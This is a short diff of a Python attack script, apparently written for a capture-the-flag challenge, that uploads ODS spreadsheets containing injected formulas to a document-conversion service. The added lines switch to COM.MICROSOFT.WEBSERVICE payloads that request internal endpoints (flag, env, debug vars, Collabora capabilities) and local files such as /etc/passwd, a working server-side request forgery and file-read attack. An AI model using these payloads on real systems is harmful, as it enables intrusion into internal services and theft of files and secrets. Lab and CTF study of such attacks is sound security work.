@@ -65,11 +65,15 @@ def marked_odt():
 for formula in (
     'INFO("release")',
     'CELL("FILENAME")',
-    'WEBSERVICE("http://webapp:8000/")',
-    'WEBSERVICE("http://webapp:8000/flag")',
-    'WEBSERVICE("http://webapp:8000/internal/flag")',
-    'WEBSERVICE("file:///etc/passwd")',
-    'WEBSERVICE("file:///flag")',
+    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/")',
+    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/flag")',
+    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/internal/flag")',
+    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/debug/vars")',
+    'COM.MICROSOFT.WEBSERVICE("http://webapp:8000/env")',
+    'COM.MICROSOFT.WEBSERVICE("http://127.0.0.1:9980/hosting/capabilities")',
+    'COM.MICROSOFT.WEBSERVICE("http://collabora:9980/hosting/capabilities")',
+    'COM.MICROSOFT.WEBSERVICE("file:///etc/passwd")',
+    'COM.MICROSOFT.WEBSERVICE("file:///flag")',
 ):
     send(formula_ods(formula), "formula.ods", "csv", formula)
 
